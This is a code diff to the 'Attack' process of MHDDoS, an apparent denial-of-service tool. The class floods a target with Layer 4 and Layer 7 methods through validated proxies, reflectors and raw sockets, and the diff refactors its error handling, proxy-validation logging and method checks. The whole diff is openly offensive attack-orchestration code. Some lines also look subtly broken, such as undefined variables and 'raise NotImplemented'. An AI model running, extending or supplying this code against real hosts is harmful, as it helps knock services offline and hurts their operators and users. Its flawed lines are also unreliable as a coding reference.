@@ -17,13 +17,19 @@ from MHDDoS.methods.layer_4 import Layer4
 from MHDDoS.methods.layer_7 import Layer7
 from MHDDoS.methods.methods import Methods
 from MHDDoS.methods.tools import Tools
-from MHDDoS.utils import proxies
 from MHDDoS.utils.config_files import read_configuration_file_lines
 from MHDDoS.utils.connectivity import ConnectivityState, ConnectivityChecker
 from MHDDoS.utils.misc import Counter, get_last_from_queue
 from MHDDoS.utils.proxies import ProxiesValidationState, ProxiesValidator, load_proxies
 from MHDDoS.utils.targets import Target
 from utils.logs import get_logger_for_current_process
+
+
+class AttackError(Exception):
+    """
+    Exception class for attack errors.
+    """
+    pass
 
 
 @dataclass
@@ -72,7 +78,7 @@ class Attack(Process):
     cpu_usage: float = 0
 
     # ATTACK THREADS
-    attack_threads: List[Thread] = None
+    attack_threads: List[Thread] = []
     attack_threads_stop_events: List[Event] = []
     INITIAL_THREADS_COUNT = 1
     THREADS_MAX_LIMIT = 1
@@ -88,7 +94,7 @@ class Attack(Process):
     # PROXIES
     PROXIES_CHECK_INTERVAL = 120  # TODO: make this a parameter of attack()?
     proxies_validator_thread: ProxiesValidator = None
-    proxies_validation_state: ProxiesValidationState
+    proxies_validation_state: ProxiesValidationState = None
     used_proxies: List[Proxy] = None
 
     # COUNTERS
@@ -120,7 +126,7 @@ class Attack(Process):
                  reflectors_file_path: str | None = None,
                  attack_state_queue: Queue = None,
                  logging_queue: Queue = None):
-        Process.__init__(self)
+        Process.__init__(self, daemon=True)
 
         self.target = target
         self.attack_methods = [m.upper() for m in attack_methods]
@@ -151,7 +157,7 @@ class Attack(Process):
         logger = self.logger
 
         # PREPARE PROCESS
-        process = self.apply_process_modifications()
+        self.process = self.apply_process_modifications()
 
         # LOAD CONFIG FILES
         self.user_agents = read_configuration_file_lines(self.user_agents_file_path) if self.user_agents_file_path is not None else []
@@ -166,7 +172,7 @@ class Attack(Process):
         self.update_throughput_counters()
 
         # INITIALIZE STATE MONITORING VARIABLES
-        self.cpu_usage = process.cpu_percent()
+        self.cpu_usage = self.process.cpu_percent()
         proxies_validation_state_queue = Queue()
         self.used_proxies: List[Proxy] = []
         connectivity_state_queue = Queue()
@@ -187,18 +193,20 @@ class Attack(Process):
             while True:
                 time.sleep(0.01)
 
-                self.proxies_validation_state: ProxiesValidationState = get_last_from_queue(proxies_validation_state_queue)
+                self.proxies_validation_state: ProxiesValidationState = proxies_validation_state_queue.get()
                 if self.proxies_validation_state is None:
                     continue
 
                 self.post_status_update()
-                logger.info(f"Waiting for initial proxy validation to complete ({self.proxies_validation_state.progress * 100:.0f}%)...")
+                logger.info(f"Waiting for initial proxy validation to complete ({self.proxies_validation_state.progress * 100:.0f}%, "
+                            f"{self.proxies_validation_state.validated_proxies_count} valid proxies found)...")
 
                 if self.proxies_validation_state.is_validation_complete:
                     used_proxies = self.proxies_validation_state.get_validated_proxies(self.proxies)
                     logger.info(f"Proxy validation completed. Found {self.proxies_validation_state.validated_proxies_count} valid proxies.")
                     if self.proxies_validation_state.validated_proxies_count == 0:
-                        exit(f"Target cannot be reached through any of {len(self.proxies)} provided proxy servers. Attack will not be executed.")
+                        logger.critical(f"Target cannot be reached through any of {len(self.proxies)} provided proxy servers. Attack will not be executed.")
+                        raise ValueError
                     break
 
         # START CONNECTIVITY CHECKER THREAD
@@ -221,7 +229,7 @@ class Attack(Process):
             time.sleep(0.5)
 
             tslr = time.time() - float(self.last_request_timestamp_counter)
-            self.cpu_usage = process.cpu_percent()
+            self.cpu_usage = self.process.cpu_percent()
 
             # poll queues
             connectivity_state = get_last_from_queue(connectivity_state_queue, self.connectivity_state)
@@ -229,7 +237,7 @@ class Attack(Process):
 
             # update proxies
             if proxies_validation_state.is_validation_complete and proxies_validation_state.validated_proxies_count > 0:
-                used_proxies = proxies_validation_state.get_validated_proxies(proxies)
+                used_proxies = proxies_validation_state.get_validated_proxies(self.proxies)
 
             # update counters
             previous_pps = self.requests_per_second
@@ -273,51 +281,50 @@ class Attack(Process):
         for attack_method in self.attack_methods.copy():
             # check if attack method is supported
             if attack_method not in Methods.ALL_METHODS:
-                handle_invalid_attack_method(attack_method,
-                                             f"Provided method ('{attack_method}') is not supported.\nAvailable methods: {', '.join(Methods.ALL_METHODS)}")
+                self.remove_invalid_attack_method(attack_method,
+                                                  f"Provided method ('{attack_method}') is not supported.\nAvailable methods: {', '.join(Methods.ALL_METHODS)}")
             # check if attack method layer matches the target's layer
             if (attack_method in Methods.LAYER7_METHODS) and not target.is_layer_7:
                 target_protocol_string = f"Layer 4" if target.is_layer_4 else f"unsupported"
-                handle_invalid_attack_method(attack_method,
-                                             f"{attack_method} belongs to Layer 7 attack methods, but the provided target ('{target}') uses {target_protocol_string} protocol ({target.protocol}).")
+                self.remove_invalid_attack_method(attack_method,
+                                                  f"{attack_method} belongs to Layer 7 attack methods, but the provided target ('{target}') uses {target_protocol_string} protocol ({target.protocol}).")
             if (attack_method in Methods.LAYER4_METHODS) and not target.is_layer_4:
                 target_protocol_string = f"Layer 7" if target.is_layer_7 else f"unsupported"
-                handle_invalid_attack_method(attack_method,
-                                             f"{attack_method} belongs to Layer 4 attack methods, but the provided target ('{target}') uses {target_protocol_string} protocol ({target.protocol}).")
+                self.remove_invalid_attack_method(attack_method,
+                                                  f"{attack_method} belongs to Layer 4 attack methods, but the provided target ('{target}') uses {target_protocol_string} protocol ({target.protocol}).")
             # check Layer 4-specific conditions
             if attack_method in Methods.LAYER4_METHODS:
                 # RAW SOCKET SUPPORT
                 if attack_method in Methods.WHICH_REQUIRE_RAW_SOCKETS and not Tools.checkRawSocket():
-                    handle_invalid_attack_method(attack_method,
-                                                 f"Attack method {attack_method} requires a creation of raw socket, but it could not be created on this machine.")
+                    self.remove_invalid_attack_method(attack_method,
+                                                      f"Attack method {attack_method} requires a creation of raw socket, but it could not be created on this machine.")
 
                 # REFLECTORS
                 if self.reflectors_file_path is not None and attack_method in Methods.WHICH_SUPPORT_REFLECTORS:
                     if not self.reflectors_file_path:
-                        handle_invalid_attack_method(attack_method,
-                                                     f"The reflector file path is not provided.\n{attack_method} attack method requires a reflector file.")
+                        self.remove_invalid_attack_method(attack_method,
+                                                          f"The reflector file path is not provided.\n{attack_method} attack method requires a reflector file.")
 
                     reflectors_text = read_configuration_file_text(reflectors_file_path)
                     if reflectors_text is None:
-                        handle_invalid_attack_method(attack_method,
-                                                     f"The reflector file doesn't exist: {reflectors_file_path}.\n{attack_method} attack method requires a reflector file.")
+                        self.remove_invalid_attack_method(attack_method,
+                                                          f"The reflector file doesn't exist: {reflectors_file_path}.\n{attack_method} attack method requires a reflector file.")
 
                     reflectors = set(a.strip() for a in ProxyTools.Patterns.IP.findall(reflectors_text))
                     if not reflectors:
-                        handle_invalid_attack_method(attack_method,
-                                                     f"Did not find any reflectors in the provided file: {reflectors_file_path}.\n{attack_method} attack method requires a reflector file.")
+                        self.remove_invalid_attack_method(attack_method,
+                                                          f"Did not find any reflectors in the provided file: {reflectors_file_path}.\n{attack_method} attack method requires a reflector file.")
 
                 # PROXIES WARNING
                 if proxies is not None and len(proxies) > 0:
                     if attack_method not in Methods.WHICH_SUPPORT_PROXIES:
-                        handle_invalid_attack_method(attack_method,
-                                                     f"{attack_method} attack method does not support proxies, while those are provided.\n"
-                                                     f"Provide empty proxies file if you want to attack using {attack_method}.")
+                        self.remove_invalid_attack_method(attack_method,
+                                                          f"{attack_method} attack method does not support proxies, while those are provided.\n"
+                                                          f"Provide empty proxies file if you want to attack using {attack_method}.")
             # check bombardier
             if attack_method == "BOMB":
                 raise NotImplemented("'BOMB' method support is not implemented yet.")
                 # TODO: (maybe) add support for BOMBARDIER
-                global BOMBARDIER_PATH
                 BOMBARDIER_PATH = Path(__dir__ / "go/bin/bombardier")
                 assert (
                         BOMBARDIER_PATH.exists()
